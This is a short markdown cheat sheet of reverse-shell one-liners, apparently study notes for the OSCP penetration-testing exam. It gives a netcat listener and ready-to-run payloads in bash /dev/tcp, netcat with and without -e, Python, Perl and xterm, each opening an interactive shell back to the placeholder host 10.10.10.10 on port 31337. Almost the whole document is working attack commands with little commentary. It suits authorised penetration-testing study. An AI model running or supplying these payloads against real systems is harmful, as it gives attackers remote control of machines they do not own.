# Reverse Shells

## Catching Reverse Shells

* Because metasploit usage is limited in the OSCP exam, we will stick to basic NetCat receivers

```bash
nc -nvlp 31337
```

## Using Tools Present

* Bash

```bash
bash -i >& /dev/tcp/10.10.10.10/31337 0>&1
```

* Netcat without -e flag

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 31337 >/tmp/f
```

* Netcat with -e flag

```bash
nc -e /bin/bash 10.10.10.10 31337
```

* Python

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

* Perl

```bash
perl -e 'use Socket;$i="10.10.10.10";$p=31337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

* Xterm

```bash
#On target system
xterm -display 10.10.10.10:1

#On Kali
Xnest :1
xhost +<targetip>
```

